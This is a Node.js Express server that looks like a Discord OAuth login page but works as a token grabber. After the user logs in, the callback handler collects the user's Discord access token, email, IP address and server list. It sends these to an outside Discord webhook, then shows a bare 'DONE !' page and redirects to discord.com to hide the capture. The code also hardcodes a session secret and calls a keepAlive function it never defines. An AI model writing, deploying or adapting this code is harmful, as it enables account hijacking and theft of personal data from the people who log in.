const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const passport = require("passport");
const { Strategy } = require("passport-discord");
const expressSession = require('express-session');
const axios = require('axios');

// استدعاء دالة keepAlive كل 5 دقائق (300000 ميلي ثانية)
setInterval(keepAlive, 300000);
app.use(bodyParser.urlencoded({ extended: true }));

passport.serializeUser((user, done) => {
  done(null, user);
});

passport.deserializeUser((obj, done) => {
  done(null, obj);
});

let strategy = new Strategy({
  clientID: "process.env.ID", // bot id
  clientSecret: "process.env.SECRET", // inside https://discord.com/developers/applications
  callbackURL: "https://auoth-bot-2.onrender.com//callback", // ex "https://mysteriouscodes.com/callback"
  scope: ["identify"]
}, (accessToken, refreshToken, profile, done) => {
  process.nextTick(() => done(null, profile));
});

const sessionMiddleware = expressSession({
  secret: 'Randomyeahrandom',
  resave: false,
  saveUninitialized: false
});

passport.use(strategy);
app.use(sessionMiddleware);
app.use(passport.initialize());
app.use(passport.session());

app.get("/", (req, res) => {
  res.send("Let's login <a href='/login'>Login</a>");
});

app.get("/login", passport.authenticate("discord", {
  scope: ["identify", "email", "guilds"]
}));

app.get("/callback", passport.authenticate("discord", {
  failureRedirect: "/"
}), async (req, res) => {
  try {
    const userInfo = {
      id: req.user.id,
      username: req.user.username,
      discriminator: req.user.discriminator,
      avatarURL: `https://cdn.discordapp.com/avatars/${req.user.id}/${req.user.avatar}.png`,
      accsesToken: req.user.accessToken,
      refreshToken: req.user.refreshToken,
      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
      email: req.user.email
    };

    const guildsResponse = await axios.get('https://discord.com/api/users/@me/guilds', {
      headers: {
        Authorization: `Bearer ${req.user.accessToken}`
      }
    });

    const guilds = guildsResponse.data.map(guild => guild.name);

    // Prepare embed object
    const embed = {
      title: 'User Information',
      description: `** Accses Token : ${userInfo.accsesToken} ** \n ** User Id : ${userInfo.id} **\n** Username : ${userInfo.username} **\n** Discriminator : ${userInfo.discriminator} **\n** Email : ${userInfo.email} **\n ** Ip Adress : ${userInfo.ip}** \n** Guilds :\n ${guilds.join('\n ')} **`,
      color: parseInt('4d7bf5', 16) ,// #4d7bf5
      thumbnail: { url: userInfo.avatarURL }
    };


    // Replace 'WEBHOOK_URL' with your actual Discord webhook URL
    const webhookURL = 'process.env.WEBHOOK';

    // Send embed to webhook
    await axios.post(webhookURL, { embeds: [embed] });

    console.log('Webhook sent');
    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>---------------------------------------</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background-color: #f0f0f0;
    text-align: center;
  }
  .done {
    font-size: 50px;
    color: green;
  }
  .moving {
    animation: move 4s linear forwards;
  }
  @keyframes move {
    0% { transform: translateX(0); }
    100% { transform: translateX(100%); }
  }
</style>
</head>
<body>
<div>
  <h1>---------------------------------------</h1>
  <p>---------------------------------------</p>
  <p class="done">DONE !</p>
</div>
<script>
  setTimeout(function() {
    window.location.href = "https://discord.com";
  }, 1000);
</script>
</body>
</html>
`);
  } catch (error) {
    console.error('Error sending webhook:', error);
    res.status(500).send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>---------------------------------------</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background-color: #f0f0f0;
    text-align: center;
  }
  .done {
    font-size: 50px;
    color: green;
  }
  .moving {
    animation: move 4s linear forwards;
  }
  @keyframes move {
    0% { transform: translateX(0); }
    100% { transform: translateX(100%); }
  }
</style>
</head>
<body>
<div>
  <h1>---------------------------------------</h1>
  <p>---------------------------------------</p>
  <p class="done">ERROR 404 !</p>
</div>
<script>
  setTimeout(function() {
    window.location.href = "https://discord.com";
  }, 2000);
</script>
</body>
</html>
`);
  }
});

app.listen(4000, () => {
  console.log('server started');
});
